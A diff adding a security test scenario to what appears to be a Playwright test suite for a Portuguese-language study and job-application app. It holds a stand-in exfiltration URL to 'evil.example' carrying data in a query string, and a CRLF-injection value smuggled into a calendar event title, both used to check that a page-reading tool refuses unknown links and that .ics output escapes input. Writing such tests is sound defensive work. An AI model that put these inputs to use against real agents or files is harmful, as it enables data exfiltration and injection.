@@ -107,6 +107,16 @@ const CENARIOS = {
     ok(r[0] === 4 && r[1] === 15, "intervalos do FSRS fora do esperado: " + r);
     ok(r[2] <= 12, "FSRS agendou depois da prova");
   },
+  "Segurança: link desconhecido recusado e .ics blindado": async (p) => {
+    const r = await p.evaluate(async () => {
+      const tools = await ferramentasBusca(); const ler = tools.find(t => t.name === "ler_pagina");
+      const recusa = ler ? await ler.execute({ url: "https://evil.example/?d=dados", objetivo: "x" }) : "sem ferramenta";
+      const f = { id: "fx", titulo: "IBGE;X\r\nURL:https://evil.example", materias: [], marcos: [{ r: "Prova", d: "2026-12-10" }], min: 40, dias: [1], criada: "2026-11-26", ok: {} };
+      return { recusa, ics: icsDaFrente(f) };
+    });
+    ok(/recusado/i.test(r.recusa), "ler_pagina leu um link que não veio das buscas");
+    ok(!/\r\nURL:/.test(r.ics) && /IBGE\\;X/.test(r.ics), ".ics aceitou uma linha injetada ou não escapou o ponto e vírgula");
+  },
   "Candidatura: pacote e acompanhamento": async (p) => {
     await p.evaluate(() => { M.curriculo = "Pastor há 8 anos, finanças da igreja. Excel e Power BI."; M.oport = { perto: { data: "2026-11-27", itens: [{ tipo: "vaga", titulo: "Assistente Administrativo", orgao: "SJMR", onde: "Boa Vista - RR", inscricao_ate: "2026-12-15", url: "https://x.gupy.io/job/1", fonte: "gupy", gid: 1, dist: null }] } }; openOportunidades("perto"); });
     await p.click('[data-op="cand"]'); await p.waitForTimeout(400);
